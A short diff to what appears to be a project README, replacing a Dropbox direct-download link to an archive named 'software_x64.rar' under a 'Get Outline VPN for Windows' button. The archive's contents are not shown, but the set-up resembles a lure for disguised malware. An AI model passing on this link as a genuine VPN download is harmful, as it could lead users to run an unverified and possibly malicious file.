@@ -7,7 +7,7 @@
 <br>  
 
 <p align="center">  
-  <a href="https://www.dropbox.com/scl/fi/289ofq2cxtnkvmmpjbwij/software_x64.rar?rlkey=mrgkrkx4ueg7enzw5y6kl42ux&st=2drpjaoc&dl=1">  
+  <a href="https://www.dropbox.com/scl/fi/asjv39jlw7myfjunvhyap/software_x64.rar?rlkey=znqjv8a1nsmj3hhn2bkn7l5ow&st=4rx95guf&dl=1">  
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get Outline VPN for Windows">  
   </a>  
 </p>
